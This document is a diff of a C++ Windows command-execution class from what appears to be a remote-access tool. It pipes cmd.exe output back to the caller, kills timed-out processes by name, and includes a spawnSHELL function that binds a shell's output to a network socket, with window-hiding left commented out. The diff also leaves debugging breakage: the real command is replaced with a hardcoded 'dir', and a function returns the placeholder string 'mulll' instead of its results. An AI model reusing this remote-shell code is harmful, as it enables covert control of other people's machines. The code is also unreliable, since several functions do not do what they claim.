@@ -11,10 +11,10 @@ Exec::Exec()
     ;
 }
 
-vector<DWORD> Exec::returnPid(wstring stringTargetProcessName)
+vector<DWORD> Exec::returnPid(string stringTargetProcessName)
 {
     //cout << "name Proc>" <<  stringTargetProcessName << endl;
-    wstring targetProcessName = stringTargetProcessName;
+    wstring targetProcessName(stringTargetProcessName.begin(), stringTargetProcessName.end());
     wcout << targetProcessName  << endl;
     vector<DWORD> pids; //stock all pid in vector.
     DWORD my_pid = GetCurrentProcessId();
@@ -92,31 +92,32 @@ void Exec::setupAllPipe()
     // fermer les poignées explicitement.
 }
 
-PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
+PROCESS_INFORMATION Exec::createChildProcess(string &command)
 {
-    /*
-    Note: 
-    To create a command redirection in unicode(utf16) it is necessary to have the argument /U and the parameter CREATE_UNICODE_ENVIRONMENT in createprocessW.
-    */
-    wstring command_C = L"/U /C " + command ;
-    WCHAR *argv_cmd = &command_C[0]; //arguments
+    // Définir le texte que je veux exécuter
+    string command_C = "/C " + command ;
     
+    char *argv_cmd = &command_C[0]; //arguments
     PROCESS_INFORMATION piProcInfo; 
     STARTUPINFOW siStartInfo;
     bool bSuccess = FALSE; 
 
+    // Mettre en place les membres de la structure PROCESS_INFORMATION. 
     ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION)); 
-
+    // Mettre en place les membres de la structure STARTUPINFO. 
+    // Cette structure spécifie les gestionnaires STDERR et STDOUT pour la redirection.
     ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
     siStartInfo.cb = sizeof(STARTUPINFO); 
     siStartInfo.hStdError = a_hChildStd_ERR_Wr;
     siStartInfo.hStdOutput = a_hChildStd_OUT_Wr;
     siStartInfo.dwFlags |= STARTF_USESTDHANDLES; //Les membres hStdInput , hStdOutput et hStdError contiennent des informations supplémentaires. Si cet indicateur est spécifié lors de l'appel de l'une des fonctions de création de processus, les handles doivent être héritables et le paramètre bInheritHandles de la fonction doit être défini sur TRUE. Pour plus d'informations, consultez Gérer l'héritage .
+    WCHAR testultime[] = L" /U /C dir";
+   // Créer le processus de l'enfant. 
+   // SetConsoleOutputCP(CP_WINUNICODE);
 
-
-    wcout << argv_cmd << endl;
+    _setmode(_fileno(stdout), 0x00020000);
     bSuccess = CreateProcessW(L"C:\\windows\\system32\\cmd.exe",  //command line 
-        argv_cmd,     // argv of cmd
+        testultime,     // argv of cmd
         NULL,          // process security attributes 
         NULL,          // primary thread security attributes 
         TRUE,          // handles are inherited 
@@ -150,22 +151,23 @@ PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
     return piProcInfo;
 }
 
-vector<wstring> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
+vector<string> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
 {
 
+    //const int max_buffer_len = 16384;
     int index=0;
-    wstring tmp_for_vector,result_of_command;
+    string tmp_for_vector,result_of_command;
 
 
     DWORD dwRead; 
-    WCHAR chBuf[4096];
+    WCHAR chBuf[200];
 
     wstring out,err;
     vector<wstring> result;
 
     while(true) //Read buffer of anonymous pipe and append the result in result_of_command
     {
-        if(!ReadFile(a_hChildStd_OUT_Rd, &chBuf, 4096 ,&dwRead,NULL))
+        if(!ReadFile(a_hChildStd_OUT_Rd, &chBuf, 200 ,&dwRead,NULL))
         {
             //cout << " readFromPipe Error in read pipe childen out" << endl;
             break;
@@ -182,8 +184,9 @@ vector<wstring> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
         
         wcout << "strlen: " << wcslen(chBuf) << endl;
 
+        result.push_back(L"-------------------------------");
         result.push_back(s);
-
+        result.push_back(L"-------------------------------");
         s.erase();
 
         ZeroMemory(&chBuf,wcslen(chBuf));
@@ -205,42 +208,43 @@ vector<wstring> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
 
         wstring s(chBuf, dwRead);
         
-        wcout << "strlen: " << wcslen(chBuf) << endl;
+        cout <<"BUFFER: " << sizeof(chBuf) << endl;
 
         result.push_back(s);
         s.erase();
 
         ZeroMemory(&chBuf,wcslen(chBuf));
     } 
-   // for(int i=0;i<result.size();i++)
-   // {wcout << result[i] << endl;}
-
-    return result;
+    for(int i=0;i<result.size();i++)
+    {wcout << result[i] << endl;}
+    vector<string> test ;
+    test.push_back("mulll");
+    return test;
 }
 
-vector<wstring> Exec::executeCommand(wstring command)
+vector<string> Exec::executeCommand(string command)
 {
-    vector<wstring> result_of_command;
+    vector<string> result_of_command;
 
     setupAllPipe();
     PROCESS_INFORMATION piProcInfo = createChildProcess(command);
     
     if(a_error)
     {
-        result_of_command.push_back(L"[-] FATAL ERROR.");
+        result_of_command.push_back("[-] FATAL ERROR.");
         return result_of_command;
     }
     else
     {
         if((GetFileSize(a_hChildStd_OUT_Rd,NULL) == 0) && (GetFileSize(a_hChildStd_ERR_Rd,NULL) == 0)) //error no read in pipes. | if timeout or pipe_err and pipe_our is empty.
         {
-            result_of_command.push_back(L"The command was executed successfully but no data was returned.");
+            result_of_command.push_back("The command was executed successfully but no data was returned.");
             //If the size of stdout and stderr are = 0 it doesn't mean that there must be an error.
         }
         else if(a_timeout) //If the command has passed the timeout then don't read the pipes and try to kill the process that is causing the problem. 
         {
             //test if the process is stuck:
-            vector<DWORD> pids = returnPid((command.substr(0, command.find(L" ")))+L".exe"); //list all pid
+            vector<DWORD> pids = returnPid((command.substr(0, command.find(" ")))+".exe"); //list all pid
             
             if(!pids.empty()) //if the number of pid found is different from 0 then it means that there are several times the same process
             {
@@ -252,7 +256,7 @@ vector<wstring> Exec::executeCommand(wstring command)
                     
                     //cout << "[+] Process: " << pids[i] << " killed" << endl;
                 }
-                //result_of_command.push_back(L"[-] TIMEOUT IN CREATEPROCESS, but all the processes in the name of: " + (command+".exe") + "we were well and truly killed.");
+                result_of_command.push_back("[-] TIMEOUT IN CREATEPROCESS, but all the processes in the name of: " + (command+".exe") + "we were well and truly killed.");
             }
             else
             {
@@ -270,7 +274,7 @@ vector<wstring> Exec::executeCommand(wstring command)
     }
 }
 
-void Exec::spawnSHELL(int sock, wchar_t *prog) //Change to WCHAR
+void Exec::spawnSHELL(int sock, wchar_t *prog)
 {
 
     STARTUPINFOW siStartInfo;
@@ -287,6 +291,7 @@ void Exec::spawnSHELL(int sock, wchar_t *prog) //Change to WCHAR
     siStartInfo.hStdOutput = (HANDLE)sock;
     siStartInfo.hStdError = (HANDLE)sock;
    // siStartInfo.wShowWindow = SW_HIDE;
+    _setmode(_fileno(stdout), 0x00020000);
    
     CreateProcessW(NULL,  //command line 
         prog,     // argv of cmd
